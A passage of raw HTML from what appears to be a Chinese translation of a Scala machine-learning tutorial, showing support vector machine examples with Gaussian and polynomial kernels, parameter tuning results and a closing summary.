class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split the comma separated value string into an array of strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-61&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//把用逗号分隔的数值字符串分解为一个字符串数组&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-63&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the values from the strings&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从字符串中抽取数值&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;coordinates&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-67&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifier&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dataArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toInt&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-68&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-69&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And return the result in a format that can later &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-70&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//easily be used to feed to Smile&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-71&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//并以一定格式返回结果，使得该结果之后容易输入到Smile中处理&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-72&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;coordinates&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifier&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-73&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0097 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;案例1（高斯核函数）&lt;/h3&gt;
&lt;p&gt;在本案例中，我们介绍了最常用的 SVM 核函数，即高斯核函数。我们的想法是帮助读者寻找该核函数的最佳输入参数。本例中用到的数据可以在&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/SVM_Example_1.csv&quot;&gt;这里&lt;/a&gt;下载。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/4c84095e46377f2ea933101d195ce53b.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt;从该图中可以清楚看出，线性回归线在这里起不了作用。我们要使用一个 SVM 来作预测。在给出的第一段代码中，高斯核函数的 sigma 值为 0.01，边距惩罚系数为 1.0，类别总数为 2，并将其传递给了 SVM。那么，这些都代表什么意思呢？&lt;/p&gt;
&lt;p&gt;我们从高斯核函数说起。这个核函数反映了 SVM 如何计算系统中成对数据的相似度。对于高斯核函数，用到了欧氏距离中的方差。我们特意挑选高斯核函数的原因是，数据中并不含有明显的结构如线性函数、多项式函数或者双曲线函数。相反地，数据聚集成了3组。&lt;/p&gt;
&lt;p&gt;我们传递到高斯核中构造函数的参数是 sigma。这个 sigma 值反映了核函数的平滑程度。我们会演示改变这一取值如何影响预测效果。我们将边距惩罚系数取 1。这一参数定义了系统中向量的边距，因此，这一值越小，约束向量就越多。我们会执行一组运行测试，通过结果向读者说明这个参数在实践中的作用。注意其中 s: 代表 sigma，c: 代表校正惩罚系数。百分数表示预测效果的误差率， 它只不过是训练之后，对相同数据集的错误预测的百分数。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/fc809e19981d13c5a8a2de0c9d8d5207.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59786&quot; src=&quot;/images/jobbole.com/a1616f3694556e76f62ce52fa9c6ca79.jpg&quot; alt=&quot;cvvv&quot; width=&quot;799&quot; height=&quot;259&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不幸的是，并不存在为每个数据集寻找正确 sigma 的黄金法则。不过，可能最好的方法就是计算数据的 sigma 值，即 √(variance)，然后在这个值附近取值看看哪一个 sigma 值效果最好。因为本例数据的方差在 0.2 与 0.5 之间，我们把这区间作为中心并在中心的两边都选取一些值，以比较我们的案例中使用高斯核的 SVM 的表现。&lt;/p&gt;
&lt;p&gt;看看表格中的结果和错误预测的百分比，它表明产生最佳效果的参数组合是一个非常低的 sigma (0.001) 和一个 1.0 及以上的校正率。不过，如果把这个模型应用到实际中的新数据上，可能会产生过拟合。因此，在用模型本身的训练数据测试模型时，你应该保持谨慎。一个更好的方法是使用交叉验证，或用新数据验证。&lt;/p&gt;
&lt;h3&gt;案例2（多项式核函数）&lt;/h3&gt;
&lt;p&gt;高斯核并不总是最佳选择，尽管在应用 SVM 时，它是最常用的核函数。因此，在本例中，我们将演示一个多项式核函数胜过高斯核函数的案例。注意，虽然本案例中的示例数据是构建好的，但在本领域内相似的数据（带有一点噪声）是可以找到的。本案例中的训练数据可以在&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/SVM_Example_2.csv&quot;&gt;这里&lt;/a&gt;下载，测试数据在&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/SVM_Example_2_Test_data.csv&quot;&gt;这里&lt;/a&gt;下载。&lt;/p&gt;
&lt;p&gt;对于本例数据，我们用一个三次多项式创建了两个类别，并生成了一个测试数据文件和一个训练数据文件。训练数据包含x轴上的前500个点，而测试数据则包含x轴上500到1000这些点。为了分析多项式核函数的工作原理，我们将数据汇成图。左图是训练数据的，右图是测试数据的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/13560706ff8b635e80558b1a176bee08.jpg&quot; width=&quot;325px&quot;&gt; &lt;img src=&quot;/images/jobbole.com/2a4e66ba554b655335e4e7fd08d27892.jpg&quot; width=&quot;325px&quot;&gt;&lt;/p&gt;
&lt;p&gt;考虑到本实例开头给出的基本代码，我们作如下的替换：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613d9636649622&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Scala&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val trainingPath = &quot;/users/.../Example Data/SVM_Example_2.csv&quot;
val testingPath = &quot;/users/.../Example Data/SVM_Example_2_Test_data.csv&quot;&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613d9636649622-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613d9636649622-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d9636649622-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../Example Data/SVM_Example_2.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d9636649622-2&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../Example Data/SVM_Example_2_Test_data.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;然后，如果我们使用高斯核并且运行代码，就可以得到如下结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/b1909c5933466e2c6928478c8e519dbb.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59787&quot; src=&quot;/images/jobbole.com/2b80663966c6ce4bbf47feca54f19d50.jpg&quot; alt=&quot;fd&quot; width=&quot;801&quot; height=&quot;264&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以看到，即使是最佳情况，仍然有 27.4% 的测试数据被错误分类。这很有趣，因为当我们观察图像时，可以看到两个类别之间有一个很明显的区分。我们可以对 sigma 和校正率进行微调，但是当预测点很远时（例如 x 是 100000），sigma 和校正率就会一直太高而使模型表现不佳（时间方面与预测效果方面）。&lt;/p&gt;
&lt;p&gt;因此，我们将高斯核替换为多项式核，代码如下：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613dc481456664&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Scala&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 val svm = new SVM[Array[Double]](new PolynomialKernel(2), 1.0,2)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613dc481456664-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613dc481456664-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;svm&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;SVM&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;PolynomialKernel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0008 seconds] --&gt;
&lt;p&gt;注意我们给多项式核的构造函数传递 2 的方式。这个 2 代表它要拟合的函数的次数。如果我们不单考虑次数为 2 的情况，我们还考虑次数为2、3、4、5的情况，并且让校正率再一次在 0.001 到 100 之间变化，则得到如下结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/feb25bec148e7bfce61b97877f372351.png&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59788&quot; src=&quot;/images/jobbole.com/e20a67704189231c087eed61a5c5fa8a.jpg&quot; alt=&quot;aaa&quot; width=&quot;795&quot; height=&quot;264&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从中我们可以看到，次数为 3 和 5 的情况得到了100%的准确率，这两种情况中测试数据与训练数据之间没有一个点是重叠的。与高斯核的最佳情况 27.4% 的错误率相比，这种表现令人惊喜。确实要注意本例这些数据是构建好的，因此没有什么噪声数据。所以才能出现所有的“校正率”都为 0% 错误率。如果添加了噪声，则需要对校正率进行微调。&lt;/p&gt;
&lt;p&gt;以上就是对支持向量机这一部分的总结。&lt;/p&gt;
&lt;h1&gt;结论&lt;/h1&gt;
&lt;p&gt;在了解了机器学习的整体思想之后，你应该可以辨别出哪些情况分别属于分类问题、回归问题或是维数约化问题。此外，你应该理解机器学习的基本概念，什么是模型，并且知道机器学习中的一些常见陷阱。&lt;/p&gt;
&lt;p&gt;在学完本文中的实例之后，你应该学会应用 K-NN、朴素贝叶斯算法以及线性回归分析了。此外，你也能够应用文本回归、使用 PCA 合并特征以及应用支持向量机。还有非常重要的一点，就是能够建立你自己的推荐系统。&lt;/p&gt;
&lt;p&gt;如果你有疑问或关于本文的反馈，请随时通过 &lt;a href=&quot;https://github.com/Xyclade&quot;&gt;Github&lt;/a&gt;、&lt;a href=&quot;https://www.linkedin.com/profile/public-profile-settings?trk=prof-edit-edit-public_profile&quot;&gt;LinkedIn&lt;/a&gt; 或 &lt;a href=&quot;https://twitter.com/Mikedewaard&quot;&gt;Twitter&lt;/a&gt; 联系我。&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109702&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109702votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109702&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 11 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/char_c&quot;&gt;pine_pie&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/char_c&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/4144abeef4b37923e8560d10a418e8ca.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            know yourself        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/char_c&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/char_c/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

